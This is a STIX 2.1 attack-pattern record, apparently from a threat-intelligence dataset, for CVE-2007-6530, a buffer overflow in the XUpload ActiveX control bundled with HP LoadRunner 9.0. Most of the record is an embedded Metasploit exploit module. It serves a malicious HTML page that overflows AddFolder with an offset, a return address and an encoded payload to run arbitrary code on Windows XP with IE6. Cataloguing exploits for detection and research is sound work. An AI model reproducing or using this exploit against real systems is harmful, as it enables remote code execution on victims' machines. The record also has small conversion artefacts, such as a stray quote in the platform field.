{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6100bae3-f85d-4a6e-ba08-62d58072b79b",
    "created": "2024-08-14T16:44:08.710333Z",
    "modified": "2024-08-14T16:44:08.710338Z",
    "name": "HP LoadRunner 9.0 ActiveX AddFolder Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Persits Software Inc's XUpload ActiveX control(version 2.1.0.1) thats included in HP LoadRunner 9.0. By passing an overly long string to the AddFolder method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_loadrunner_addfolder.rb",
            "external_id": "hp_loadrunner_addfolder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6530"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP LoadRunner 9.0 ActiveX AddFolder Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Persits Software Inc's\n        XUpload ActiveX control(version 2.1.0.1) thats included in HP LoadRunner 9.0.\n        By passing an overly long string to the AddFolder method, an attacker may be\n        able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-6530'],\n          [ 'OSVDB', '39901'],\n          [ 'BID', '27025' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2 Pro English / IE6SP0-SP2',     { 'Offset' => 1388, 'Ret' => 0x323ad95f } ], # PocoNet.dll\n        ],\n      'DisclosureDate' => '2007-12-25',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_alpha(target['Offset']) + [target.ret].pack('V')\n    sploit << p.encoded + rand_text_alpha(1024 - p.encoded.length)\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:E87F6C8E-16C0-11D3-BEF7-009027438003' id='#{vname}'></object>\n<script language='javascript'>\n#{strname} = new String('#{sploit}')\n#{vname}.AddFolder(#{strname});\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-25",
    "x_mitre_platforms": [
        "win'"
    ]
}